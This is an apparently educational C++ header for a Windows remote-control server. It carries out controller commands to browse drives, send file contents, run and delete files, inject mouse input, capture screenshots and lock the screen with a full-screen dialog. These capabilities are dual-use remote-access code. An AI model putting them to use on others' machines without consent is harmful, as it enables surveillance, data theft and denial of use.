#pragma once
#include <map>
#include <atlimage.h>
#include <direct.h>
#include <stdio.h>
#include <io.h>
#include <list>
#include "ServerSocket.h"
#include "HeTool.h"
#include "LockDialog.h"
#include "Resource.h"
#include "Packet.h"
//#pragma warning(disable:4966) 为一种禁用警告，针对有些老函数不安全的时候

class CCommand {
public:
	CCommand();
	~CCommand(){}
	int ExcuteCommand(int nCmd, std::list<CPacket>& lstPacket, CPacket& inPacket);
	static void RunCommand(void* arg, int status, std::list<CPacket>& lstPacket, CPacket& inPacket) {
		CCommand* thiz = (CCommand*)arg;
		if (status > 0) {
			int ret = thiz->ExcuteCommand(status, lstPacket, inPacket);
			if (ret != 0) {
				TRACE("执行命令失败：%d ret=%d\r\n", status, ret);
			}
		} else {
			MessageBox(NULL, _T("无法正常接入用户，请稍后正在自动重试！"), _T("接入用户失败"), MB_OK | MB_ICONERROR);
		}
			
	}

protected:
	typedef int(CCommand::* CMDFUNC)(std::list<CPacket>&, CPacket& inPacket);			//成员函数指针
	std::map<int, CMDFUNC> m_mapFunction;		//从命令号到功能的映射
	CLockDialog dlg;
	unsigned threadid;

protected:
	//遍历磁盘目录
	int MakeDriverInfo(std::list<CPacket>& lstPacket, CPacket& inPacket) {
		//1==>A  2==>B 此前老版本为软盘，故此现在的分区都是从C开始...26==>Z
		std::string result;
		for (int i = 1; i <= 26; i++) {
			if (_chdrive(i) == 0) {
				if (result.size() > 0) result += ',';
				result += 'A' + i - 1;
			}
		}
		result += ',';

		lstPacket.push_back(CPacket(1, (BYTE*)result.c_str(), result.size()));
		Sleep(100);

		return 0;
	}

	//遍历文件目录
	int MakeDirecteryInfo(std::list<CPacket>& lstPacket, CPacket& inPacket) {
		//由于getfilepath实际上就是根据命令取走packet的strdata，而此时已经增设参数故此直接=
		std::string strPath = inPacket.strData;

		TRACE("cd C is %d\r\n", _chdir("C:"));
		if (_chdir(strPath.c_str()) != 0) {
			TRACE("cd strPath:[%s] is %d\r\n", strPath.c_str(), _chdir(strPath.c_str()));
			FILEINFO finfo;
			finfo.HasNext = FALSE;
			lstPacket.push_back(CPacket(2, (BYTE*)&finfo, sizeof(finfo)));
			OutputDebugString(_T("没有权限访问目录!!"));
			return -2;
		}

		_finddata_t fdata;
		int hfind = 0;
		if ((hfind = _findfirst("*", &fdata)) == -1) {
			//*表示匹配所有文件，如果返回-1则表示没有找到
			OutputDebugString(_T("没有找到任何文件!!"));
			FILEINFO finfo;
			finfo.HasNext = FALSE;
			lstPacket.push_back(CPacket(2, (BYTE*)&finfo, sizeof(finfo)));
			return -3;
		}

		int Count = 0;	//发送时文件数
		do {
			FILEINFO finfo;
			finfo.IsDirectory = (fdata.attrib & _A_SUBDIR) != 0;
			memcpy(finfo.szFileName, fdata.name, strlen(fdata.name));
			TRACE("%s\r\n", finfo.szFileName);
			lstPacket.push_back(CPacket(2, (BYTE*)&finfo, sizeof(finfo)));
			Count++;
		} while (!_findnext(hfind, &fdata));
		TRACE("server:count=%d\r\n", Count);

		//发送信息到控制端
		FILEINFO finfo;
		finfo.HasNext = FALSE;
		lstPacket.push_back(CPacket(2, (BYTE*)&finfo, sizeof(finfo)));

		return 0;
	}


	//打开文件
	int RunFIle(std::list<CPacket>& lstPacket, CPacket& inPacket) {
		//由于getfilepath实际上就是根据命令取走packet的strdata，而此时已经增设参数故此直接=
		std::string strPath = inPacket.strData;
		ShellExecuteA(NULL, NULL, strPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
		lstPacket.push_back(CPacket(3, NULL, 0));

		return 0;
	}


	//下载文件
	int DownloadFile(std::list<CPacket>& lstPacket, CPacket& inPacket) {
		/*
		 * 首先获取路径
		 * 然后打开文件，如果失败就结束
		 * 能打开就开始读取然后发送直至为空
		 * 最后关闭
		*/
		std::string strPath = inPacket.strData;
		//TRACE("server getPath[%s]\r\n", strPath.c_str());

		long long data = 0;
		FILE* pFile = NULL;
		errno_t err = fopen_s(&pFile, strPath.c_str(), "rb");
		//TRACE("server getErr:%d\r\n", err);
		if (err != 0) {
			lstPacket.push_back(CPacket(4, (BYTE*)&data, 8));
			return -1;
		}

		if (pFile != NULL) {
			//优化进度条，以免文件过大时空等
			fseek(pFile, 0, SEEK_END);
			data = _ftelli64(pFile);
			lstPacket.push_back(CPacket(4, (BYTE*)&data, 8));
			fseek(pFile, 0, SEEK_SET);

			char buffer[1024] = "";
			size_t rlen = 0;
			do {
				rlen = fread(buffer, 1, 1024, pFile);				//每次读1字节，读1024次
				lstPacket.push_back(CPacket(4, (BYTE*)&buffer, rlen));	//读到之后发送
			} while (rlen >= 1024);
			fclose(pFile);
		} else {
			//循环发送完后最后是空代表结束
			lstPacket.push_back(CPacket(4, NULL, 0));
		}

		return 0;
	}


	//鼠标操作
	int MouseEvent(std::list<CPacket>& lstPacket, CPacket& inPacket) {
		MOUSEEV mouse;
		//参照原先server那getmouseevent
		memcpy(&mouse, inPacket.strData.c_str(), sizeof(MOUSEEV));
	
		DWORD nFlags = 0;
		switch (mouse.nButton) {
			case 0:		//左键
				nFlags = 1;
				break;
			case 1:		//右键
				nFlags = 2;
				break;
			case 2:		//中键
				nFlags = 4;
				break;
			case 4:		//没有按键
				nFlags = 8;
				break;
		}

		if (nFlags != 8) SetCursorPos(mouse.ptXY.x, mouse.ptXY.y);
		switch (mouse.nAction) {
			case 0:		//单击
				nFlags |= 0x10;
				break;
			case 1:		//双击
				nFlags |= 0x20;
				break;
			case 2:		//按下
				nFlags |= 0x40;
				break;
			case 3:		//放开
				nFlags |= 0x80;
				break;
			default:break;
		}
		TRACE("mouse event: %08X x%d y %d\r\n", nFlags, mouse.ptXY.x, mouse.ptXY.y);
		switch (nFlags) {
			case 0x21:	//左键双击
				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
			case 0x11:	//左键单击
				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
				break;
			case 0x41:	//左键按下
				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
				break;
			case 0x81:	//左键松开
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
				break;
			case 0x22:	//右键双击
				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
			case 0x12:	//右键单击
				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
				break;
			case 0x42:	//右键按下
				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
				break;
			case 0x82:	//右键松开
				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
				break;
			case 0x24:	//中键双击
				mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
				mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
			case 0x14:	//中键单击
				mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
				mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
				break;
			case 0x44:	//中键按下
				mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
				break;
			case 0x84:	//中键松开
				mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
				break;
			case 0x08:	//单纯的鼠标移动
				mouse_event(MOUSEEVENTF_MOVE, mouse.ptXY.x, mouse.ptXY.y, 0, GetMessageExtraInfo());
				break;
		}

		lstPacket.push_back(CPacket(5, NULL, 0));

		return 0;
	}


	//通过截屏获取远程桌面
	int SendScreen(std::list<CPacket>& lstPacket, CPacket& inPacket) {
		CImage screen;	//GDI
		HDC hScreen = ::GetDC(NULL);

		//获取位宽, RGB/888=24 ARGB/8888=32
		int nBitPerPixel = GetDeviceCaps(hScreen, BITSPIXEL);
		int nWidth = GetDeviceCaps(hScreen, HORZRES);
		int nHeight = GetDeviceCaps(hScreen, VERTRES);

		//创建窗口，按照获取的宽和高还有位宽
		screen.Create(nWidth, nHeight, nBitPerPixel);
		BitBlt(screen.GetDC(), 0, 0, nWidth, nHeight, hScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hScreen);

		//测试时用的是图片文件，但是网络中需要转换成数据流发送
		HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, 0);
		if (hMem == NULL)return -1;
		IStream* pStream = NULL;
		HRESULT ret = CreateStreamOnHGlobal(hMem, TRUE, &pStream);
		if (ret == S_OK) {
			screen.Save(pStream, Gdiplus::ImageFormatPNG);
			LARGE_INTEGER bg = { 0 };
			pStream->Seek(bg, STREAM_SEEK_SET, NULL);
			PBYTE pData = (PBYTE)GlobalLock(hMem);
			SIZE_T nSize = GlobalSize(hMem);
			lstPacket.push_back(CPacket(6, pData, nSize));
			GlobalUnlock(hMem);
		}

		pStream->Release();
		GlobalFree(hMem);
		screen.ReleaseDC();
		return 0;
	}


	//利用线程处理锁机窗口
	static unsigned _stdcall threadLockDlg(void* arg) {
		CCommand* thiz = (CCommand*)arg;
		thiz->threadLockDlgMain();
		_endthreadex(0);
		return 0;
	}


	//锁机所产生的窗口
	void threadLockDlgMain() {
		//创建对话框，显示，不可调整大小|不可移动
		dlg.Create(IDD_DIALOG_INFO, NULL);
		dlg.ShowWindow(SW_SHOW);
		//遮蔽后面的应用
		CRect rect;
		rect.left = 0;
		rect.top = 0;
		rect.right = GetSystemMetrics(SM_CXFULLSCREEN);
		rect.bottom = GetSystemMetrics(SM_CYFULLSCREEN);
		rect.bottom = LONG(rect.bottom * 1.10);
		dlg.MoveWindow(rect);

		//将字体稍微调整至中间
		CWnd* pText = dlg.GetDlgItem(IDC_STATIC);
		if (pText) {
			CRect rtText;
			pText->GetWindowRect(rtText);
			int nWidth = rtText.Width();
			int x = (rect.right - nWidth) / 2;
			int nHeight = rtText.Height();
			int y = (rect.bottom - nHeight) / 2;
			pText->MoveWindow(x, y, rtText.Width(), rtText.Height());
		}

		//窗口置顶
		dlg.SetWindowPos(&dlg.wndTopMost, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
		//隐藏鼠标
		ShowCursor(false);
		//隐藏任务栏
		::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_HIDE);

		dlg.GetWindowRect(rect);
		rect.left = 0;
		rect.top = 0;
		rect.right = 1;
		rect.bottom = 1;
		ClipCursor(rect);			//限制鼠标的活动范围

		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
			if (msg.message == WM_KEYDOWN) {
				TRACE("msg:%08X wparam:%08X lparam:%08X", msg.message, msg.wParam, msg.lParam);
				if (msg.wParam == 0x41) {	//按下a键推出 0x1b为esc
					break;
				}
			}
		}
		ClipCursor(NULL);
		ShowCursor(true);
		::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_SHOW);
		dlg.DestroyWindow();
	}


	//锁机
	int LockMachine(std::list<CPacket>& lstPacket, CPacket& inPacket) {
		if ((dlg.m_hWnd != NULL) || (dlg.m_hWnd != INVALID_HANDLE_VALUE)) {
			//_beginthread(threadLockDlg, 0, NULL);
			_beginthreadex(NULL, 0, &CCommand::threadLockDlg, this, 0, &threadid);
			TRACE("threadid:%d\r\n", threadid);
		}

		lstPacket.push_back(CPacket(7, NULL, 0));
		return 0;
	}


	//解锁机
	int UnlockMachine(std::list<CPacket>& lstPacket, CPacket& inPacket) {
		//dlg.SendMessage(WM_KEYDOWN, 0x41, 0x01E0001);
		PostThreadMessage(threadid, WM_KEYDOWN, 0x41, 0);
		lstPacket.push_back(CPacket(8, NULL, 0));

		return 0;
	}


	//测试连接
	int TestConnect(std::list<CPacket>& lstPacket, CPacket& inPacket) {
		lstPacket.push_back(CPacket(1981, NULL, 0));
		return 0;
	}


	//删除文件
	int DeleteLocalFile(std::list<CPacket>& lstPacket, CPacket& inPacket) {
		std::string strPath = inPacket.strData;
		TCHAR sPath[MAX_PATH] = _T("");
		//中文容易乱码，导致需要转换
		MultiByteToWideChar(
			CP_ACP, 0, strPath.c_str(), strPath.size(), sPath,
			sizeof(sPath) / sizeof(TCHAR));
		TRACE("DeleteFile[%s]\r\n", sPath);
		DeleteFile(sPath);

		lstPacket.push_back(CPacket(9, NULL, 0));
		return 0;
	}
};

